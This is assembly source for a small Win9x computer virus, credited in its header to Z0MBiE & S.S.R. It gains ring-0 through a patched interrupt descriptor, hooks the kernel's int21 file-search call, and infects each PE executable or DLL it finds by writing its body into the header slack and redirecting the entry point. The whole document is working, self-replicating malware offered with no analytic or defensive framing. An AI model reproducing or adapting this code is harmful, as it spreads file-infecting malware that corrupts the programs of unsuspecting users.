   ; Win9X.149  by Z0MBiE & S.S.R.

   ; kernel-resident, PE-EXE/DLL header infector
   ;

   ; virus:
   ; BFF70800 xx           xxx
   ; kernel_int21:
   ; BFF712B9 51           push    ecx          ; 00
   ; BFF712BA 50           push    eax          ; 01
   ; BFF712BB 68 002A0010  push    002A0010h    ; 02 03 04 05 06
   ; BFF712C0 E8 0000010F  call    kernel_ord0  ; 07 08 09 0A 0B (kernel_i21x=8)
   ; BFF712C5 C3           ret                  ; 0C            (kernel_c1=10Fh)
   ; kernel_ord0:
   ; BFF713D4 ..           ...

   bufsize                 equ     4096

   kernel_myaddr           equ     0BFF70800h
   kernel_ord0             equ     0BFF713D4h
   kernel_int21            equ     0BFF712B9h
   kernel_i21x             equ     8
   kernel_c1               equ     (kernel_ord0-(kernel_int21+kernel_i21x+4))

                           p386
                           model   flat

                           .code
   start:
                           dd      kernel_int21; B9 12 F7 BF xx
                           db      0           ; ecx=00BFF712

                           push    edi                     ; EDI <-- LDT.base
                           sidt    [esp-2]
                           pop     edi

                           fild    qword ptr [edi]         ; save desriptor #0

                           pusha

                           add     al, r0proc-start

                           stosd                           ; +0 WORD offs&0xFFFF
                           stosd                           ; +6 WORD offs>>16

                           popa

                           push    dword ptr [edi+2+8]     ; +2 DWORD sel./flags
                           pop     dword ptr [edi+2]       ;    (0xEE000028)

                           int     00h                     ; jmp to ring-0

                           ; now in ring-0

   r0proc:                 fistp   qword ptr [edi]         ; restore descr. #0

                           mov     esi, eax                ; ESI = offset start

                           mov     edi, [esi]
                           mov     dword ptr [edi+8], kernel_myaddr+hook-start-(kernel_int21+kernel_i21x+4)

                           mov     edi, [esi+c_kma-start]
                           push    (physsize+3)/4
                           pop     ecx
                           rep     movsd                   ; copy virus

                           add     eax, [esi]              ; +(oldeip-curreip)
                           pop     ecx                     ; set new iret.EIP
                           push    eax

                           iret                            ; back to host/ring3

                           ; now in ring-3

   hook:                   cmp     ax, 714Eh               ; hook it
                           jne     hookexit

   infect:                 pusha                           ; save regs
                           enter   bufsize+256, 0          ; push ebp/mov ebp,esp/sub esp,bufsize

                           mov     esi, kernel_myaddr
   c_kma                   equ     dword ptr $-4

                           mov     ax, 3D02h               ; openfile, r/w
                           call    [esi]                   ; int21
                           jc      infect_exit
                           xchg    ebx, eax                ; EBX = file handle

                           mov     ch, bufsize/256  ; ecx==cl --> ECX=bufsize+CL

                           mov     edx, esp                ; EDX=offset buf

                           mov     ah, 3Fh                 ; read buffer
                           call    [esi]                   ; int21

                           mov     ecx, [edx+3Ch]          ; ECX = mz.pe_ptr
                           cmp     ecx, eax                ; EAX = numread
                           jae     infect_close

                           add     ecx, edx               ; ECX=PE header offset

                           mov     eax, [ecx+54h]          ; pe_headersize
                           inc     [ecx+54h].byte ptr 1    ; pe_headersize+=256
                           lea     edi, [edx+eax]  ; EDI=our new location in buf
                           xchg    eax, [ecx+28h]       ; EAX <--> entrypointrva
                           sub     eax, [ecx+28h]
                           jle     infect_close   ; alredy?

                           push    (physsize+3)/4
                           pop     ecx

                           pusha

                           xor     eax, eax
                           repz    scasd                   ; should be 0s
                           jne     infect_close   ; it's allright. 'leave' there

                           cdq

                           mov     ah, 42h                 ; AX=4200--seek begin
                           call    [esi]                   ; int21

                           popa

                           push    esi
                           rep     movsd                   ; copy virus to buf
                           pop     esi

                           stosd                           ; store oldeip

                           mov     ch, bufsize/256         ; ECX = bufsize

                           mov     ah, 40h                 ; write virus
                           call    [esi]                   ; int21

   infect_close:
                           mov     ah, 3Eh                 ; close file
                           call    [esi]                   ; int21

   infect_exit:
                           leave                         ; mov esp,ebp / pop ebp
                           popa                            ; restore regs

   hookexit:               db      0E9h                  ; return to kernel_ord0
                           dw      kernel_ord0-(kernel_myaddr+($+4-start))

   physsize                equ     $-start

                           dw      0               ;-)
                           dd      0

                           .data

     db      3 dup (13,10),'--------------------------',13,10
     db      'þ physsize = '
     db      physsize/ 100 mod 10+'0'
     db      physsize/  10 mod 10+'0'
     db      physsize/   1 mod 10+'0'
     db      ' bytes',13,10
     db      '--------------------------',4 dup (13,10)

                           end     start
